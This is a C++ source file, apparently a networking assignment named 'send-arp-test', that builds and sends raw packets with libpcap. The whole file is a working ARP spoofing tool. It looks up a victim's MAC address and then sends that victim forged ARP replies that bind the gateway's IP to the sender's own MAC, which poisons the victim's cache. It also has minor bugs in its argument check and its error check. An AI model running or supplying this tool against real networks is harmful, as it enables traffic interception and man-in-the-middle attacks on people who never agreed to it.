#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <iostream>
#include <iomanip>
#include <sstream>
#include <netinet/ether.h>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

EthArpPacket to_broadcast_packet(string MY_MAC, char * MY_IP, char *argv[], int i){
		EthArpPacket packet;

		packet.eth_.dmac_ = Mac::broadcastMac();
		packet.eth_.smac_ = Mac(MY_MAC);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(MY_MAC);
		packet.arp_.sip_ = htonl(Ip(string(MY_IP)));
		packet.arp_.tmac_ = Mac::nullMac();
		packet.arp_.tip_ = htonl(Ip(argv[(2 + 2 * i)]));

		return packet;
}

EthArpPacket to_make_send_packet(EthArpPacket* recieved_packet, string MY_MAC, char * MY_IP, char *argv[], int i){
	EthArpPacket to_send_packet;

	to_send_packet.eth_.dmac_ = recieved_packet->arp_.smac();//destination mac address is <sender mac>
	to_send_packet.eth_.smac_ = Mac(MY_MAC);
	to_send_packet.eth_.type_ = htons(EthHdr::Arp);

	to_send_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	to_send_packet.arp_.pro_ = htons(EthHdr::Ip4);
	to_send_packet.arp_.hln_ = Mac::SIZE;
	to_send_packet.arp_.pln_ = Ip::SIZE;
	to_send_packet.arp_.op_ = htons(ArpHdr::Reply);
	to_send_packet.arp_.smac_ = Mac(MY_MAC);
	to_send_packet.arp_.sip_ = htonl(Ip(argv[(3 + 2 * i)]));//Sip address is <target ip> == gateway's ip, here is the main point of this task.
	to_send_packet.arp_.tmac_ = recieved_packet->arp_.smac();
	to_send_packet.arp_.tip_ = htonl(Ip(argv[(2 + 2 * i)]));//target ip is <sender ip>

	return to_send_packet;
}

int main(int argc, char* argv[]) {
	if (argc <= 3 && argc & 1 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	//MAC ADDRESS
    struct ifreq ifr;
    int fd;

    memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, argv[1]);

    fd = socket(AF_INET, SOCK_STREAM, 0);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    stringstream ss;
    for (int i = 0; i < 6; ++i) {
       	ss << setfill('0') << setw(2) << hex << static_cast<unsigned int> (static_cast<unsigned char>(ifr.ifr_hwaddr.sa_data[i]));
       	if (i < 5) {
         	ss << ":";
		}
	}
	string MY_MAC = ss.str();
    close(fd);
    //MY IP
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, argv[1], IFNAMSIZ-1);
    ioctl(fd, SIOCGIFADDR, &ifr);
	char * MY_IP = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
    close(fd);

	for(int i = 0;i < (argc / 2) - 1;i++){
		pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		if (handle == nullptr) {
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}

		EthArpPacket to_broadcast_p = to_broadcast_packet(MY_MAC, MY_IP, argv, i);
		//make own packet and send to broadcast
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&to_broadcast_p), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		while(1){
			struct pcap_pkthdr* header;
			const u_char* tp;
			
			int input_packet = pcap_next_ex(handle, &header, &tp);
			if(input_packet == 0) continue; //if there is no input packet, continuing receiving
			else if(input_packet == PCAP_ERROR || input_packet == PCAP_ERROR_BREAK){
				fprintf(stderr, "pcap_next_ex return %d error=%s\n", input_packet, pcap_geterr(handle));
			}

			EthArpPacket* recieved_packet = (EthArpPacket*)tp;
			if(recieved_packet->eth_.type() == EthHdr::Arp && recieved_packet->arp_.op() == ArpHdr::Reply && recieved_packet->arp_.sip() == Ip(argv[(2 + 2 * i)]) && recieved_packet->arp_.tmac() == Mac(MY_MAC)){
				EthArpPacket to_send_packet = to_make_send_packet(recieved_packet, MY_MAC, MY_IP,argv, i);

				int sendsend = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&to_send_packet), sizeof(EthArpPacket));
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", sendsend, pcap_geterr(handle));
				}
				break;
			}
		}
		pcap_close(handle);
	}
}
